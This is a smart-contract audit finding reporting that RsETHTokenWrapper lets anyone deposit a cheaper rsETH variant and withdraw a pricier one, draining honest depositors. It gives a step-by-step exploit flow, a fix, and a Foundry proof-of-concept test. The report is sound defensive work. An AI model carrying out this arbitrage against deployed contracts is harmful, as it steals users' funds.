Audit Report

## Title
Cross-Token Arbitrage Enables Direct Theft of Higher-Value rsETH Variant From `RsETHTokenWrapper` — (`contracts/L2/RsETHTokenWrapper.sol`)

## Summary

`RsETHTokenWrapper` accepts multiple allowed rsETH-variant tokens and mints wrsETH 1:1 for any of them, but maintains no per-token accounting. Because any holder of wrsETH can burn it to withdraw *any* allowed token held by the contract, an attacker can deposit the cheaper variant and withdraw the more expensive one whenever the two trade at different prices, directly stealing the price difference from honest depositors.

## Finding Description

The contract's NatSpec states the design assumption: *"the alt rsETH tokens can be swapped 1:1 for the canonical rsETH token"* [1](#0-0)  — but this assumption is never enforced on-chain.

`reinitialize` explicitly adds a second allowed token, confirming the multi-token design is live: [2](#0-1) 

`_deposit` accepts any allowed token and mints wrsETH 1:1 with no record of which token was deposited: [3](#0-2) 

`_withdraw` burns wrsETH and transfers *any* allowed token the caller names, with no check that the caller deposited that token: [4](#0-3) 

Both entry points are public with no access control: [5](#0-4) 

The only guard in each path is `allowedTokens[_asset]`, which confirms the token is permitted but says nothing about whether the contract holds enough of it or whether it is equivalent in value to what was deposited. [6](#0-5) 

**Exploit flow:**
1. Wrapper holds 100 `tokenA` (worth 1.05 ETH each) deposited by honest users.
2. Attacker buys 100 `tokenB` (worth 1.00 ETH each) on the open market.
3. Attacker calls `deposit(tokenB, 100e18)` → receives 100 wrsETH.
4. Attacker calls `withdraw(tokenA, 100e18)` → receives 100 `tokenA` worth 105 ETH.
5. Net profit: 5 ETH extracted from honest `tokenA` depositors, who now find only `tokenB` in the wrapper and cannot withdraw `tokenA`.

## Impact Explanation

**Critical — Direct theft of user funds.** Honest depositors of the higher-value token lose the price spread to the attacker. The attack scales linearly with the price spread and the balance of the more expensive token held by the wrapper. Victims are left unable to withdraw their original token (insufficient balance), receiving only the cheaper variant instead.

## Likelihood Explanation

The `reinitialize` function confirms the multi-token design is intentionally deployed. Bridge representations of the same underlying LST routinely trade at small but non-zero spreads on L2 DEXes due to bridge latency, liquidity imbalances, or temporary depeg events. The attack requires no special permissions, no flash loan, and no oracle manipulation — only a price difference between two tokens the contract already supports. It is repeatable as long as a spread exists.

## Recommendation

Enforce per-token accounting: track how much of each allowed token backs the outstanding wrsETH supply, and restrict withdrawals of a given token to the amount of that token actually held as collateral. Alternatively, restrict each wrapper instance to a single underlying token (the simplest safe design). If multi-token support is required, integrate a trusted on-chain price feed and revert withdrawals when the requested token's price deviates from the deposited token's price beyond a tight tolerance.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Foundry fork/unit test outline
// Preconditions:
//   tokenA = rsETH_OFT, market price 1.05 ETH per token
//   tokenB = altRsETH,  market price 1.00 ETH per token
//   wrapper.allowedTokens[tokenA] == true
//   wrapper.allowedTokens[tokenB] == true
//   wrapper holds 100e18 tokenA (deposited by honest users)
//   attacker holds 100e18 tokenB

function testCrossTokenArbitrage() public {
    uint256 amount = 100e18;

    // Step 1: attacker deposits cheaper token
    vm.startPrank(attacker);
    tokenB.approve(address(wrapper), amount);
    wrapper.deposit(address(tokenB), amount);
    // attacker now holds 100e18 wrsETH

    assertEq(wrapper.balanceOf(attacker), amount);

    // Step 2: attacker withdraws more expensive token
    wrapper.withdraw(address(tokenA), amount);
    // attacker now holds 100e18 tokenA (worth 105 ETH)
    // attacker spent 100e18 tokenB (worth 100 ETH)
    // net gain: 5 ETH

    assertEq(tokenA.balanceOf(attacker), amount);

    // Step 3: honest user who deposited tokenA can no longer withdraw it
    vm.stopPrank();
    vm.startPrank(honestUser);
    vm.expectRevert(); // ERC20: transfer amount exceeds balance
    wrapper.withdraw(address(tokenA), amount);
}
```
